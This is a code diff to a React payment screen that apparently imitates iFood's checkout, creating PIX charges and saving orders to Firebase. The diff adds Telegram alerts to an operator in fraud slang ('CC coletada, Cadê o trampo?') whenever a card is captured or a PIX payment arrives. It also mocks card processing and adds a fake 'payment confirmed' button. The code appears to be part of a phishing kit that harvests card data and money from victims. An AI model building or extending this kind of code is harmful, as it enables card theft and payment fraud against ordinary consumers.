@@ -6,6 +6,7 @@ import { motion } from 'framer-motion';
 import { db } from '../services/firebase';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 import { authenticateVeopag, createPixDeposit } from '../services/veopag';
+import { notifyTelegram } from '../services/telegram';
 import QRCode from 'react-qr-code';
 
 export default function IFoodPaymentScreen() {
@@ -74,8 +75,17 @@ export default function IFoodPaymentScreen() {
                 };
                 const qrResponse = await createPixDeposit(token, total, customer);
                 setPixData(qrResponse);
+
+                // NOTIFICATION: "Quando o endpoint /pix cria cobrança"
+                // insertPix()
+                await notifyTelegram("Pix acabou de ser gerado, de olho no lance!");
             } else {
                 // Cartão finalizado com sucesso (Mock)
+
+                // NOTIFICATION: "Quando /order com card=true for inserida no banco"
+                // insertCardOrder()
+                await notifyTelegram("CC coletada, Cadê o trampo?");
+
                 setOrderSuccess(true);
             }
 
@@ -83,6 +93,20 @@ export default function IFoodPaymentScreen() {
         } catch (err) {
             console.error("Erro ao processar pedido:", err);
             alert("Erro ao salvar no banco Firebase: " + err.message);
+        } finally {
+            setIsProcessing(false);
+        }
+    };
+
+    const handleMockPixPaid = async () => {
+        setIsProcessing(true);
+        try {
+            // Como não teremos webhook no Vercel, o cliente/sistema simula a aprovação aqui
+            await notifyTelegram("Pix acabou de cair no manguito!!");
+            setPixData(null);
+            setOrderSuccess(true);
+        } catch (e) {
+            console.error(e);
         } finally {
             setIsProcessing(false);
         }
@@ -109,6 +133,13 @@ export default function IFoodPaymentScreen() {
                     className="w-full bg-[#FF2B62] text-white font-bold py-3.5 rounded-md active:bg-ifood-dark"
                 >
                     Copiar código PIX
+                </button>
+
+                <button
+                    onClick={handleMockPixPaid}
+                    className="w-full bg-green-500 text-white font-bold py-3.5 rounded-md mt-4 active:bg-green-600 shadow-md"
+                >
+                    Já realizei o pagamento (Simular Confirmação)
                 </button>
 
                 <button onClick={() => navigate('/')} className="mt-6 font-bold text-[#FF2B62]">
